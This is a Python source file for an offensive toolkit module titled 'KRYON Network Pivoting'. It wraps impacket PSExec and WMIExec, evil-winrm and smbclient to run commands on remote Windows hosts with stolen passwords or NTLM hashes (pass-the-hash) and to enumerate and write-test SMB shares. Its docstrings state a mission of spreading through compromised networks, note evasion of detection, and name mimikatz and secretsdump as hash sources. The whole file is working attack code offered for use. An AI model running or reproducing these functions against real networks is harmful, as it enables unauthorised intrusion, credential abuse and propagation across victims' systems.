"""
KRYON Network Pivoting - Lateral Movement

Tools for moving laterally through compromised networks.

Clearance Level: Alpha-Orange (Network Infiltration Authority)
Specialization: Lateral movement and network propagation
Mission: Spread through internal networks to reach objectives

This module provides:
- PSExec and remote execution
- WMI lateral movement
- Pass-the-hash attacks
- Credential relay attacks
- Network share enumeration
"""

import re
import subprocess
from typing import Any, Optional


def psexec_lateral_movement(
    target_host: str,
    username: str,
    password: Optional[str] = None,
    ntlm_hash: Optional[str] = None,
    command: str = "cmd.exe",
    domain: Optional[str] = None,
) -> dict[str, Any]:
    """
    Execute commands on remote Windows host using PSExec.

    PSExec allows remote command execution on Windows systems
    with valid credentials or NTLM hashes.

    Args:
        target_host: Target Windows host IP or hostname
        username: Username for authentication
        password: Plaintext password (if available)
        ntlm_hash: NTLM hash (for pass-the-hash)
        command: Command to execute on target
        domain: Active Directory domain (if applicable)

    Returns:
        Dictionary containing:
        - execution_success: Whether command executed
        - output: Command output
        - target_host: Target system
        - method: Authentication method used
        - success: Whether operation completed

    Example:
        >>> # PSExec with password
        >>> result = psexec_lateral_movement(
        ...     target_host="192.168.1.10",
        ...     username="Administrator",
        ...     password="Password123!",
        ...     command="whoami"
        ... )
        >>> print(result['output'])

        >>> # PSExec with NTLM hash (pass-the-hash)
        >>> result = psexec_lateral_movement(
        ...     target_host="192.168.1.10",
        ...     username="Administrator",
        ...     ntlm_hash="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
        ...     command="whoami"
        ... )

    Tools Used:
        - impacket-psexec (Linux)
        - psexec.py from Impacket suite
    """
    results = {
        "execution_success": False,
        "output": "",
        "target_host": target_host,
        "method": "",
        "success": False,
        "error": None,
    }

    try:
        # Build psexec command
        if ntlm_hash:
            # Pass-the-hash
            cmd = ["impacket-psexec", "-hashes", ntlm_hash]
            results["method"] = "pass-the-hash"
        elif password:
            # Password authentication
            cmd = ["impacket-psexec"]
            results["method"] = "password"
        else:
            results["error"] = "Either password or ntlm_hash required"
            return results

        # Add domain if specified
        if domain:
            user_spec = f"{domain}/{username}"
        else:
            user_spec = username

        if password:
            user_spec += f":{password}"

        cmd.append(f"{user_spec}@{target_host}")
        cmd.append(command)

        # Execute
        process = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

        results["output"] = process.stdout + process.stderr

        if process.returncode == 0:
            results["execution_success"] = True

        results["success"] = True

    except FileNotFoundError:
        results["error"] = "impacket-psexec not found - install with: apt-get install impacket-scripts"
    except subprocess.TimeoutExpired:
        results["error"] = "Command execution timed out"
    except Exception as e:
        results["error"] = str(e)

    return results


def wmi_lateral_movement(
    target_host: str,
    username: str,
    password: Optional[str] = None,
    ntlm_hash: Optional[str] = None,
    command: str = "whoami",
    domain: Optional[str] = None,
) -> dict[str, Any]:
    """
    Execute commands on remote Windows host using WMI.

    WMI (Windows Management Instrumentation) allows remote
    command execution and is often less detected than PSExec.

    Args:
        target_host: Target Windows host
        username: Username for authentication
        password: Plaintext password
        ntlm_hash: NTLM hash (for pass-the-hash)
        command: Command to execute
        domain: Active Directory domain

    Returns:
        Similar to psexec_lateral_movement()

    Example:
        >>> result = wmi_lateral_movement(
        ...     target_host="192.168.1.10",
        ...     username="Administrator",
        ...     password="Password123!",
        ...     command="ipconfig /all"
        ... )

    Tools Used:
        - impacket-wmiexec
    """
    results = {
        "execution_success": False,
        "output": "",
        "target_host": target_host,
        "method": "wmi",
        "success": False,
        "error": None,
    }

    try:
        # Build wmiexec command
        if ntlm_hash:
            cmd = ["impacket-wmiexec", "-hashes", ntlm_hash]
        elif password:
            cmd = ["impacket-wmiexec"]
        else:
            results["error"] = "Either password or ntlm_hash required"
            return results

        # Add credentials
        if domain:
            user_spec = f"{domain}/{username}"
        else:
            user_spec = username

        if password:
            user_spec += f":{password}"

        cmd.append(f"{user_spec}@{target_host}")
        cmd.append(command)

        # Execute
        process = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

        results["output"] = process.stdout + process.stderr

        if process.returncode == 0:
            results["execution_success"] = True

        results["success"] = True

    except FileNotFoundError:
        results["error"] = "impacket-wmiexec not found - install impacket-scripts"
    except Exception as e:
        results["error"] = str(e)

    return results


def enumerate_smb_shares(
    target_host: str,
    username: Optional[str] = None,
    password: Optional[str] = None,
    ntlm_hash: Optional[str] = None,
) -> dict[str, Any]:
    """
    Enumerate SMB shares on target Windows host.

    Discovers accessible network shares that can be used
    for lateral movement or data exfiltration.

    Args:
        target_host: Target Windows host
        username: Username (optional for null session)
        password: Password
        ntlm_hash: NTLM hash

    Returns:
        Dictionary containing:
        - shares: List of discovered shares
        - writable_shares: Shares with write access
        - readable_shares: Shares with read access
        - admin_shares: Administrative shares (C$, ADMIN$, etc.)

    Example:
        >>> # Anonymous enumeration
        >>> result = enumerate_smb_shares("192.168.1.10")
        >>>
        >>> # With credentials
        >>> result = enumerate_smb_shares(
        ...     target_host="192.168.1.10",
        ...     username="guest",
        ...     password="guest"
        ... )
        >>>
        >>> for share in result['shares']:
        ...     print(f"Share: {share['name']}")
        ...     print(f"  Type: {share['type']}")
        ...     print(f"  Comment: {share['comment']}")
        ...     print(f"  Writable: {share['writable']}")
    """
    results = {
        "shares": [],
        "writable_shares": [],
        "readable_shares": [],
        "admin_shares": [],
        "success": False,
        "error": None,
    }

    try:
        # Use smbclient to enumerate shares
        cmd = ["smbclient", "-L", target_host]

        if username:
            cmd.extend(["-U", f"{username}%{password or ''}"])
        else:
            cmd.extend(["-N"])  # No password (null session)

        # Execute
        process = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        output = process.stdout + process.stderr

        # Parse shares
        share_pattern = r"^\s+(\S+)\s+(Disk|IPC|Printer)\s+(.*)$"

        for line in output.split("\n"):
            match = re.match(share_pattern, line)
            if match:
                share_name = match.group(1)
                share_type = match.group(2)
                share_comment = match.group(3)

                share_info = {
                    "name": share_name,
                    "type": share_type,
                    "comment": share_comment,
                    "writable": False,
                    "readable": False,
                }

                # Test access
                if share_type == "Disk":
                    access = _test_share_access(target_host, share_name, username, password)
                    share_info["writable"] = access["writable"]
                    share_info["readable"] = access["readable"]

                    if access["writable"]:
                        results["writable_shares"].append(share_name)
                    if access["readable"]:
                        results["readable_shares"].append(share_name)

                # Identify admin shares
                if share_name.endswith("$"):
                    results["admin_shares"].append(share_name)

                results["shares"].append(share_info)

        results["success"] = True

    except FileNotFoundError:
        results["error"] = "smbclient not found - install with: apt-get install smbclient"
    except Exception as e:
        results["error"] = str(e)

    return results


def _test_share_access(host: str, share: str, username: Optional[str], password: Optional[str]) -> dict[str, bool]:
    """Test read/write access to SMB share."""
    access = {"readable": False, "writable": False}

    try:
        # Test read access
        cmd = ["smbclient", f"//{host}/{share}"]

        if username:
            cmd.extend(["-U", f"{username}%{password or ''}"])
        else:
            cmd.extend(["-N"])

        cmd.extend(["-c", "ls"])

        process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

        if process.returncode == 0:
            access["readable"] = True

            # Test write access
            cmd = ["smbclient", f"//{host}/{share}"]
            if username:
                cmd.extend(["-U", f"{username}%{password or ''}"])
            else:
                cmd.extend(["-N"])

            cmd.extend(["-c", "mkdir skynet_test ; rmdir skynet_test"])

            process = subprocess.run(cmd, capture_output=True, timeout=10)

            if process.returncode == 0:
                access["writable"] = True

    except Exception:
        pass

    return access


def pass_the_hash_attack(
    target_host: str,
    username: str,
    ntlm_hash: str,
    command: str = "whoami",
    domain: Optional[str] = None,
    method: str = "psexec",
) -> dict[str, Any]:
    """
    Pass-the-hash attack to authenticate without plaintext password.

    Use captured NTLM hashes to authenticate to remote systems
    without cracking them.

    Args:
        target_host: Target Windows host
        username: Username
        ntlm_hash: NTLM hash (format: LM:NTLM or just NTLM)
        command: Command to execute
        domain: Active Directory domain
        method: Execution method (psexec, wmi, smb)

    Returns:
        Dictionary containing execution results

    Example:
        >>> # Use captured hash from mimikatz/secretsdump
        >>> result = pass_the_hash_attack(
        ...     target_host="192.168.1.10",
        ...     username="Administrator",
        ...     ntlm_hash="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
        ...     command="net user",
        ...     method="psexec"
        ... )

    Common Hash Sources:
        - mimikatz: sekurlsa::logonpasswords
        - impacket-secretsdump: secretsdump.py
        - Windows registry: SAM/SYSTEM dump
    """
    results = {"success": False, "error": None}

    try:
        if method == "psexec":
            results = psexec_lateral_movement(
                target_host=target_host,
                username=username,
                ntlm_hash=ntlm_hash,
                command=command,
                domain=domain,
            )
        elif method == "wmi":
            results = wmi_lateral_movement(
                target_host=target_host,
                username=username,
                ntlm_hash=ntlm_hash,
                command=command,
                domain=domain,
            )
        else:
            results["error"] = f"Unknown method: {method}"

    except Exception as e:
        results["error"] = str(e)

    return results


def winrm_lateral_movement(
    target_host: str,
    username: str,
    password: str,
    command: str = "whoami",
    domain: Optional[str] = None,
    use_ssl: bool = False,
) -> dict[str, Any]:
    """
    Execute commands via Windows Remote Management (WinRM).

    WinRM is often enabled in modern Windows environments,
    especially with PowerShell remoting.

    Args:
        target_host: Target Windows host
        username: Username
        password: Password
        command: Command or PowerShell script to execute
        domain: Active Directory domain
        use_ssl: Use HTTPS (port 5986) instead of HTTP (port 5985)

    Returns:
        Execution results

    Example:
        >>> result = winrm_lateral_movement(
        ...     target_host="192.168.1.10",
        ...     username="Administrator",
        ...     password="Password123!",
        ...     command="Get-Process"
        ... )

    Tools Used:
        - evil-winrm
    """
    results = {"execution_success": False, "output": "", "success": False, "error": None}

    try:
        # Build evil-winrm command
        cmd = ["evil-winrm", "-i", target_host, "-u", username, "-p", password]

        if use_ssl:
            cmd.append("-S")

        if domain:
            cmd.extend(["-d", domain])

        cmd.extend(["-c", command])

        # Execute
        process = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

        results["output"] = process.stdout

        if process.returncode == 0:
            results["execution_success"] = True

        results["success"] = True

    except FileNotFoundError:
        results["error"] = "evil-winrm not found - install with: gem install evil-winrm"
    except Exception as e:
        results["error"] = str(e)

    return results
